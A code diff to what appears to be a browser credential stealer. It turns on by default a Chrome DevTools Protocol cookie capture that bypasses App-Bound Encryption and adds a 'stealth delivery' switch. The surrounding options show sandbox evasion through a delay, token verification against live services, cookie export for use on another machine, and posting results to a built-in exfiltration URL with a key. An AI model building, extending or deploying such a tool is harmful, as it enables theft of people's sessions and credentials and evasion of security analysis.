@@ -54,7 +54,7 @@ if sys.stdout is not None:
 
 # Set True in main() when --verify is passed; gates OIDC discovery network calls
 _do_oidc: bool = False
-_enable_cdp: bool = False
+_enable_cdp: bool = True
 _DEFAULT_DELAY: int = 0
 
 
@@ -2051,7 +2051,8 @@ def main():
     parser.add_argument("--max-hits",         type=int, default=_DEFAULT_MAX_HITS, help="Max memory hits per browser before dedup (default: 1000)")
     parser.add_argument("--verify",           action="store_true", default=_DEFAULT_VERIFY,      help="Verify captured tokens against their services (makes outbound requests)")
     parser.add_argument("--export-cookies",   metavar="PATH",      help="Export browser cookies to Netscape jar file for portable use on another machine")
-    parser.add_argument("--enable-cdp",       action="store_true", help="Relaunch a running Chromium browser with --remote-debugging-port to capture cookies via CDP (bypasses App-Bound Encryption)")
+    parser.add_argument("--enable-cdp",       dest="enable_cdp", action="store_true", default=True, help="Relaunch a running Chromium browser with --remote-debugging-port to capture cookies via CDP (bypasses App-Bound Encryption) — enabled by default")
+    parser.add_argument("--no-cdp",           dest="enable_cdp", action="store_false", help="Disable CDP cookie capture (stealth delivery)")
     parser.add_argument("--delay",            type=int, default=_DEFAULT_DELAY, help="Sleep N seconds before extraction (evade short-timeout sandboxes)")
     parser.add_argument("--exfil",            metavar="URL",       default=_EXFIL_URL or None, help="POST results to report server (default: baked in at build time)")
     parser.add_argument("--exfil-key",        metavar="KEY",       default=_EXFIL_KEY or None, help="API key for --exfil (default: baked in at build time)")
